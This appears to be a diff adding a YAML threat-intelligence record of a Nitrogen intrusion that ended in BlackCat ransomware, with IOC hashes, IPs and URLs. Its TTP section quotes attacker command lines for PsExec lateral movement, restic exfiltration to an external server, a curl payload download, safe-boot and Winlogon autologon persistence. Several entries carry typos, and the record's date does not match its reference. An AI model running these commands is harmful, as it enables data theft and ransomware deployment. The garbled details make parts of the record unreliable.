@@ -1,0 +1,108 @@
+description: This report details a cyber threat campaign involving the use of Sliver,
+  Cobalt Strike, Restic for data exfiltration, and ransomware (BlackCat). The attackers
+  leveraged various techniques including PsExec, batch scripts, and registry modifications
+  to achieve persistence and deploy malicious payloads.
+date: '2023-09-30'
+attribution: Unknown
+malware_families:
+- Cobalt Strike
+- Sliver
+- BlackCat
+TTPs:
+  processs:
+  - cmd.exe
+  - PsExec64.exe
+  - restic.exe
+  - wmic.exe
+  - vssadmin.exe
+  - wevtutil.exe
+  - arp.exe
+  - python.exe
+  - example.exe
+  - pythonw.exe
+  - powershell.exe
+  - cnd.exe
+  - winlogon.exe
+  - wbem\\niprvse.exe
+  - curl.exe
+  - setup.exe
+  commandline:
+  - cmd.exe /C PsExec64.exe -accepteula \\\\<DOMAIN-CONTROLLER-IP> -c -f -d -s up.bat
+  - cmd.exe /C for /f %a in (pc.txt) do copy /y \\\\<REDACTED>\\c$\\<REDACTED>.exe
+    \\\\%a\\c$\\<REDACTED>.exe
+  - cmd.exe /C PsExec64.exe -accepteula @pc.txt -c -f -d -h 1.bat
+  - restic.exe -r rest:http://195.123.226.84:8000/ init --password-file ppp.txt
+  - restic.exe -r rest:http://195.123.226.84:8000/ --password-file ppp.txt --use-fs-snapshot
+    --verbose backup "F:\\Shares\\<REDACTED>\\<REDACTED>"
+  - cmd.exe /C bcdedit /set {default} safeboot network
+  - cmd.exe /C reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce
+    /v *a /t REG_SZ /d "cmd.exe /c C:\\<REDACTED-COMPANY-NAME>.exe" /f
+  - cmd.exe /C reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+    /v DefaultUserName /t REG_SZ /d <REDACTED-DOMAIN-NAME>\\backup2 /f
+  - cmd.exe /C reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+    /v DefaultPassword /t REG_SZ /d JapanNight!128 /f
+  - cmd.exe /C reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+    /v AutoAdminLogon /t REG_SZ /d 1 /f
+  - cmd.exe /C timeout /T 10 shutdown -r -t 0
+  - cmd /c cd \\ 1> \\\\127.8.8.1\\ADHINS\\__1699460381.628624520
+  - cmd /c cd 1> \\\\127.9..1\\ADHINS\\__1699468351.0200245 2521
+  - cmd /c cd c:\\windows\\adfs\\ 1>\\\\127.6.0.1\\ADHINS\\__1699468351.6200245 2581
+  - cmd /c mkdir py 1> \\\\127.8.0.1\\ADNINS\\__1699460381
+  - cmd /c curl -k https://91.92.245.26/python.zip -0c:\\windows\\adfs\\py\\python.zip
+    1>\\\\127.9.8.1\\ADNINS\\__1699468381.0206245 2581
+  - powershell -w hidden -command Expand-ArchiveC:\\windows\\adfs\\py\\python.zip
+    -DestinationPathC:\\windows\\adfs\\py\\
+  - dir 1> \\\\127.8.8.1\\ADHINS\\__1699468381.6286245 2561
+  - pythonw.exe wol2.py 1>\\\\127.9.8.1\\ADNINS\\__1699468381.0206245 2561
+  powershell:
+  - 'Expand-ArchiveC:\\windows\\adfs\\py\\python.zip -DestinationPath C:\\windows\\adfs\\py\\'
+  scripting_engine: []
+  registry_keys:
+  - HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce
+  - HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
+  - HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\15991160457623399845550968347370640942
+  network_connections: []
+  file_modifications:
+  - C:\\<REDACTED>.exe
+  - F:\\Shares\\<REDACTED>\\<REDACTED>
+  - ppp.txt
+  - C:\\Users\\ \\Downloads\\Version\\setup. exe
+  - c:\\windows\\adfs\\py\\UpdateJson.exe
+  - c:\\windows\\adfs\\py\\o12.py
+  - c:\\windows\\adfs\\py\\python.zip
+  persistence:
+  - Registry modifications to Winlogon for automatic logon.
+  - Scheduled task via batch script (up.bat).
+  - Adding ransomware binary to RunOnce registry key.
+  pipes: []
+  process_relations:
+  - C:\\<REDACTED-COMPANY-NAME>.exe ----> C:\\example.exe
+  - C:\\example.exe --access-token REDACTED --safeboot-network --------> C:\\Windows\\SysWOW64\\cmd.exe
+IOCs:
+  hashes:
+  - DBF5F56998705C37076B6CAE5D0BFB4D
+  - E6AB3C595AC703AFD94618D1CA1B8EBCE623B21F
+  - 5DC8B08C7E1B11ABF2B6B311CD7E411DB16A7C3827879C6F93BD0DAC7A71D321
+  - EB64862F1C8464CA3D03CF0A4AC608F4
+  - 6F43E6388B64998B7AA7411104B955A8949C4C63
+  - 726F038C13E4C90976811B462E6D21E10E05F7C11E35331D314C546D91FA6D21
+  - 3A4FDBC642A24A240692F9CA70757E9F
+  - 794203A4E18F904F0D244C7B3C2F5126B58F6A21
+  - 5F7D438945306BF8A7F35CAB0E2ACC80CDC9295A57798D8165EF6D8B86FBB38D
+  ips:
+  - 91.92.250.158
+  - 91.92.251.240
+  - 94.156.67.175
+  - 94.156.67.180
+  - 185.73.124.238
+  - 195.123.226.84
+  - 127.8.8.1
+  - 127.9..1
+  - 127.6.0.1
+  - 91.92.245.26
+  domains: []
+  urls:
+  - http://195.123.226.84:8000/
+  - https://91.92.245.26/python.zip
+reference: https://thedfirreport.com/2024/09/30/nitrogen-campaign-drops-sliver-and-ends-with-blackcat-ransomware/
+file_creation_date: May 13, 2025
